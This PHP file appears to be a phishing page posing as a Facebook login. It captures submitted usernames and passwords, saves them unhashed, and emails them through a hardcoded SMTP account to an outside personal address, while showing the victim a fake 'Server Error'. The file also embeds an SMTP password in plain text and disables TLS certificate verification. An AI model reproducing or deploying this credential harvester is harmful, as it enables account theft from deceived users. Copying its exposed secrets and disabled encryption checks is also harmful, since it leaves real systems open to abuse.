<?php
require_once('config.inc.php');
require_once('functions.inc.php');
require_once('includes/phpmailer/PHPMailerAutoload.php');
$pdo = connect();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];    
    
    try {
        $query = "INSERT INTO users
                  (username, password)
                  VALUES (:username, :password)";
        $insert = $pdo->prepare($query);
        $insert->bindValue(':username', $username, PDO::PARAM_STR);
        $insert->bindValue(':password', $password, PDO::PARAM_STR);
        $is_success = $insert->execute();
        
        if ($is_success) {
            $body =  'username: '.$username.'<br>';
            $body .= 'password: '.$password;
            $to = 'jerome2kph@gmail.com';
            
            $mail = new PHPMailer();
            $mail->IsSMTP();
            $mail->CharSet = 'UTF-8';
            
            $mail->SMTPOptions = array(
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'allow_self_signed' => true
                )
            ); // end of $mail->SMTPOptions = array(
            
            $mail->Host       = "mail.bubospecs.com"; // SMTP server example
            $mail->SMTPDebug  = 0; // enables SMTP debug information (for testing)
            $mail->SMTPAuth   = true; // enable SMTP authentication
            $mail->Port       = 587; // set the SMTP port for the GMAIL server
            $mail->Username   = "fbtest@bubospecs.com"; // SMTP account username example
            $mail->Password   = "aCcessdenied321!@#"; // SMTP account password example
            $mail->setFrom('fbtest@bubospecs.com', 'fbtest');
            $mail->addAddress($to); // Add a recipient
            $mail->isHTML(true); // Set email format to HTML
            $mail->Subject = 'fbtest';
            $mail->Body = $body;
            $mail->send();            
        } // end of if ($is_success)
        
    } // end of try
    
    catch(PDOException $e) {        
        echo 'PDOException: '.$e->getMessage();        
    } // end of catch(PDOException $e)
    
} // end of if ($_SERVER['REQUEST_METHOD'] == 'POST')

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <?php require_once('meta.inc.php'); ?>
    <meta name="description" content="Page Description">
    <title>Facebook</title>    
    <?php require_once('styles.inc.php'); ?>
    <?php //include_once('favicons.inc.php'); ?>
    <?php include_once('google-fonts.inc.php'); ?>
    <?php require_once('head-scripts.inc.php'); ?>    
</head>
<body id="page-home">        
    Server Error
    <?php include_once('footer.inc.php'); ?>
    <?php require_once('footer-scripts.inc.php'); ?>    
</body>
</html>